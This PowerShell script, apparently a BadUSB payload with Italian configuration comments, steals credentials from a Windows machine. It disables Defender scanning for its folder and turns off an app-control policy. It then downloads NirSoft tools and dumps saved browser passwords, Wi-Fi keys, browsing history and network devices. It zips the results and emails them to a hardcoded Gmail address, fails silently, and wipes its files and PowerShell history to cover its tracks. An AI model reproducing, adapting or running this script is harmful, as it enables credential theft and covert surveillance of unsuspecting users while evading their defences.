#                      _                        
#  _   _  ___  _   _  | | ___ __   _____      __
# | | | |/ _ \| | | | | |/ /  _ \ / _ \ \ /\ / /
# | |_| | (_) | |_| |_|   <| | | | (_) \ V  V / 
#  \__, |\___/ \__,_(_)_|\_\_| |_|\___/ \_/\_/  
#  |___/                                        

[CmdletBinding()]
param() # Parametri rimossi poiché non più necessari per l'email

# ==============================================================================
# CONFIGURAZIONE EMAIL (MODIFICA QUI)
# ==============================================================================
$EmailFrom = "canzali.martino09@gmail.com"        # La tua email
$EmailPass = "HoIdatiTuoi"     # Password per le App (non quella normale!)
$EmailTo   = "canzali.martino09@gmail.com"       # Dove ricevere i dati
$SmtpServer = "smtp.gmail.com"              # Server SMTP (es. smtp.gmail.com o smtp.office365.com)
$SmtpPort   = 587                            # Porta TLS
# ==============================================================================

$basePath = "C:\Users\Public\Documents\scripts"
$dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
$dumpFile = "$dumpFolder.zip"

# Create directory
New-Item -ItemType Directory -Path $basePath -Force | Out-Null
Set-Location $basePath
New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
Add-MpPreference -ExclusionPath $basePath -Force
Set-ItemProperty `
  -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" `
  -Name "VerifiedAndReputablePolicyState" `
  -Type DWord `
  -Value 0
CiTool --refresh --json

# Download necessary tools
Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe
Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe
Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe
Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe

# Execute tools to gather data
.\WNetWatcher.exe /stext connected_devices.txt
.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext history.txt
.\WebBrowserPassView.exe /stext passwords.txt
.\WirelessKeyView.exe /stext wifi.txt

# Wait for the files to be fully written
while (!(Test-Path "passwords.txt") -or !(Test-Path "wifi.txt") -or !(Test-Path "connected_devices.txt") -or !(Test-Path "history.txt")) {
    Start-Sleep -Seconds 1
}

Move-Item passwords.txt, wifi.txt, connected_devices.txt, history.txt -Destination "$dumpFolder"

# Compress extracted data
Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force

# Wait until the ZIP file is created
while (!(Test-Path "$dumpFile")) {
    Start-Sleep -Seconds 1
}

# --- EXFILTRATION VIA EMAIL ---
try {
    $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, $SmtpPort)
    $SMTPClient.EnableSsl = $true
    $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($EmailFrom, $EmailPass)

    $MailMessage = New-Object Net.Mail.MailMessage($EmailFrom, $EmailTo)
    $MailMessage.Subject = "Exfiltration - Target: $env:USERNAME"
    $MailMessage.Body = "Here are the exfiltrated credentials and logs from user $env:USERNAME on machine $env:COMPUTERNAME."
    
    # Attach the ZIP file
    $Attachment = New-Object Net.Mail.Attachment($dumpFile)
    $MailMessage.Attachments.Add($Attachment)

    $SMTPClient.Send($MailMessage)
} catch {
    # Silently fail to avoid alerting the user
}

# Cleanup
Set-Location C:\Users\Public\Documents
Remove-Item -Recurse -Force scripts
Remove-Item "C:\Users\Public\Documents\ps.ps1"
Remove-MpPreference -ExclusionPath "C:\Users\Public\Documents\scripts" -Force
Remove-MpPreference -ExclusionPath "C:\Users\Public\Documents" -Force
Set-ItemProperty `
  -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" `
  -Name "VerifiedAndReputablePolicyState" `
  -Type DWord `
  -Value 1
CiTool --refresh --json

# Caps Lock signal
$keyBoardObject = New-Object -ComObject WScript.Shell
for ($i=0; $i -lt 4; $i++) {
    $keyBoardObject.SendKeys("{CAPSLOCK}")
    Start-Sleep -Seconds 1
}

# Clear command history
Clear-Content (Get-PSReadlineOption).HistorySavePath

exit
